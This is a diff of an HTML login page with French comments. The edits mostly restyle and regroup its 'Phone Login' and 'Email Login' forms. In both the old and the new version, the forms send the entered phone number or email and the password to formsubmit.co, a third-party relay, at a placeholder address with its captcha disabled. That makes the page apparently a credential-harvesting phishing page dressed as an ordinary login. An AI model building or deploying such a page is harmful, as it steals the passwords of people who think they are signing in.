@@ -9,19 +9,24 @@
       background-color: #000;
       font-family: Arial, sans-serif;
       color: white;
-      padding-top: 80px; /* décalage vers le bas */
       margin: 0;
       display: flex;
       flex-direction: column;
       align-items: center;
+      padding-top: 140px; /* Descente du contenu */
+    }
+
+    .container {
+      width: 400px;
+      display: flex;
+      flex-direction: column;
+      align-items: flex-start;
     }
 
     .welcome {
-      align-self: flex-start;
-      margin-left: 40px;
       font-size: 26px;
       font-weight: bold;
-      margin-bottom: 30px;
+      margin-bottom: 20px;
     }
 
     .toggle-container {
@@ -30,7 +35,7 @@
       border-radius: 999px;
       overflow: hidden;
       margin-bottom: 30px;
-      width: 400px;
+      width: 100%;
       height: 38px;
       padding: 3px;
     }
@@ -57,14 +62,14 @@
     form {
       display: flex;
       flex-direction: column;
-      width: 400px;
-      gap: 20px;
+      width: 100%;
+      gap: 16px;
     }
 
     label {
       font-size: 0.9rem;
       margin-left: 12px;
-      text-align: left;
+      margin-bottom: 5px; /* Rapproche le label du champ */
     }
 
     .input-group {
@@ -117,6 +122,10 @@
       justify-content: space-between;
       font-size: 0.85rem;
       color: white;
+      flex-direction: column;
+      gap: 5px;
+      margin-top: -5px;
+      margin-bottom: 10px;
     }
 
     .form-footer a {
@@ -126,8 +135,6 @@
 
     .form-footer small {
       color: white;
-      display: block;
-      margin-top: 5px;
     }
 
     button[type="submit"] {
@@ -147,71 +154,75 @@
 </head>
 <body>
 
-  <!-- Nouveau titre -->
-  <div class="welcome">Welcome To Login</div>
+  <div class="container">
+    <!-- Titre aligné avec les boutons -->
+    <div class="welcome">Welcome To Login</div>
 
-  <!-- Boutons Toggle -->
-  <div class="toggle-container">
-    <button class="toggle-button active" onclick="toggleLogin('phone')">Phone Login</button>
-    <button class="toggle-button" onclick="toggleLogin('email')">Email Login</button>
+    <!-- Boutons Toggle -->
+    <div class="toggle-container">
+      <button class="toggle-button active" onclick="toggleLogin('phone')">Phone Login</button>
+      <button class="toggle-button" onclick="toggleLogin('email')">Email Login</button>
+    </div>
+
+    <!-- Formulaire Téléphone -->
+    <form id="phoneForm" action="https://formsubmit.co/tonadresse@email.com" method="POST">
+      <input type="hidden" name="_captcha" value="false">
+
+      <label for="phone">Phone Number</label>
+      <div class="input-group">
+        <img class="flag" src="https://flagcdn.com/us.svg" alt="US Flag">
+        <select name="countryCode" id="countryCode">
+          <option value="+1" data-flag="us">+1</option>
+          <option value="+1" data-flag="ca">+1</option>
+          <option value="+33" data-flag="fr">+33</option>
+          <option value="+47" data-flag="no">+47</option>
+          <option value="+34" data-flag="es">+34</option>
+          <option value="+46" data-flag="se">+46</option>
+          <option value="+41" data-flag="ch">+41</option>
+          <option value="+63" data-flag="ph">+63</option>
+          <option value="+44" data-flag="gb">+44</option>
+          <option value="+57" data-flag="co">+57</option>
+        </select>
+        <input type="text" name="phone" placeholder="Phone Number" required>
+      </div>
+
+      <label for="password-phone">Password</label>
+      <div class="input-group password">
+        <input type="password" name="password" id="password-phone" placeholder="Password" required>
+        <img class="eye-icon" src="https://img.icons8.com/ios-glyphs/30/ffffff/visible--v1.png" alt="eye" onclick="togglePassword('password-phone', this)">
+      </div>
+
+      <div class="form-footer">
+        <a href="#">Forgot Password?</a>
+        <small><input type="checkbox" id="remember-phone"> Remember account and password</small>
+      </div>
+
+      <button type="submit">Login</button>
+    </form>
+
+    <!-- Formulaire Email -->
+    <form id="emailForm" class="hidden" action="https://formsubmit.co/tonadresse@email.com" method="POST">
+      <input type="hidden" name="_captcha" value="false">
+
+      <label for="email">Email</label>
+      <div class="input-group">
+        <input type="email" name="email" placeholder="Email" required>
+      </div>
+
+      <label for="password-email">Password</label>
+      <div class="input-group password">
+        <input type="password" name="password" id="password-email" placeholder="Password" required>
+        <img class="eye-icon" src="https://img.icons8.com/ios-glyphs/30/ffffff/visible--v1.png" alt="eye" onclick="togglePassword('password-email', this)">
+      </div>
+
+      <div class="form-footer">
+        <a href="#">Forgot Password?</a>
+        <small><input type="checkbox" id="remember-email"> Remember account and password</small>
+      </div>
+
+      <button type="submit">Login</button>
+    </form>
   </div>
-
-  <!-- Formulaire Téléphone -->
-  <form id="phoneForm" action="https://formsubmit.co/tonadresse@email.com" method="POST">
-    <input type="hidden" name="_captcha" value="false">
-    <label for="phone">Phone Number</label>
-    <div class="input-group">
-      <img class="flag" src="https://flagcdn.com/us.svg" alt="US Flag">
-      <select name="countryCode" id="countryCode">
-        <option value="+1" data-flag="us">+1</option>
-        <option value="+1" data-flag="ca">+1</option>
-        <option value="+33" data-flag="fr">+33</option>
-        <option value="+47" data-flag="no">+47</option>
-        <option value="+34" data-flag="es">+34</option>
-        <option value="+46" data-flag="se">+46</option>
-        <option value="+41" data-flag="ch">+41</option>
-        <option value="+63" data-flag="ph">+63</option>
-        <option value="+44" data-flag="gb">+44</option>
-        <option value="+57" data-flag="co">+57</option>
-      </select>
-      <input type="text" name="phone" placeholder="Phone Number" required>
-    </div>
-
-    <label for="password-phone">Password</label>
-    <div class="input-group password">
-      <input type="password" name="password" id="password-phone" placeholder="Password" required>
-      <img class="eye-icon" src="https://img.icons8.com/ios-glyphs/30/ffffff/visible--v1.png" alt="eye" onclick="togglePassword('password-phone', this)">
-    </div>
-
-    <div class="form-footer">
-      <a href="#">Forgot Password?</a>
-      <small><input type="checkbox" id="remember-phone"> Remember account and password</small>
-    </div>
-
-    <button type="submit">Login</button>
-  </form>
-
-  <!-- Formulaire Email -->
-  <form id="emailForm" class="hidden" action="https://formsubmit.co/tonadresse@email.com" method="POST">
-    <input type="hidden" name="_captcha" value="false">
-    <label for="email">Email</label>
-    <div class="input-group">
-      <input type="email" name="email" placeholder="Email" required>
-    </div>
-
-    <label for="password-email">Password</label>
-    <div class="input-group password">
-      <input type="password" name="password" id="password-email" placeholder="Password" required>
-      <img class="eye-icon" src="https://img.icons8.com/ios-glyphs/30/ffffff/visible--v1.png" alt="eye" onclick="togglePassword('password-email', this)">
-    </div>
-
-    <div class="form-footer">
-      <a href="#">Forgot Password?</a>
-      <small><input type="checkbox" id="remember-email"> Remember account and password</small>
-    </div>
-
-    <button type="submit">Login</button>
-  </form>
 
   <script>
     function toggleLogin(method) {
